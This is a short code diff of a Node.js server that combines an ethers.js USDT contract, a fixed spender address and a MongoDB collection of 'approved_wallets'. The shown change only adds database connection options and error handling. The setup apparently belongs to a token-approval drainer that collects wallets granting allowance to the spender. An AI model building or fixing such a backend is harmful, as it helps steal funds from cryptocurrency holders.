@@ -1,9 +1,8 @@
-
 const express = require("express");
 const path = require("path");
 const dotenv = require("dotenv");
 const { ethers } = require("ethers");
-const { MongoClient } = require("mongodb");
+const { MongoClient, ServerApiVersion } = require("mongodb");
 
 dotenv.config();
 
@@ -29,14 +28,23 @@ const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
 const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
 
-// MongoDB Client Setup
-const client = new MongoClient(MONGO_URI);
+// ✅ MongoDB Client Setup (with Stable API fix)
+const client = new MongoClient(MONGO_URI, {
+  serverApi: {
+    version: ServerApiVersion.v1,
+    strict: true,
+    deprecationErrors: true,
+  }
+});
+
 let collection;
 
 client.connect().then(() => {
   const db = client.db("vortex_db");
   collection = db.collection("approved_wallets");
   console.log("✅ Connected to MongoDB Atlas");
+}).catch((err) => {
+  console.error("❌ MongoDB connection error:", err.message);
 });
 
 app.get("/", (req, res) => {
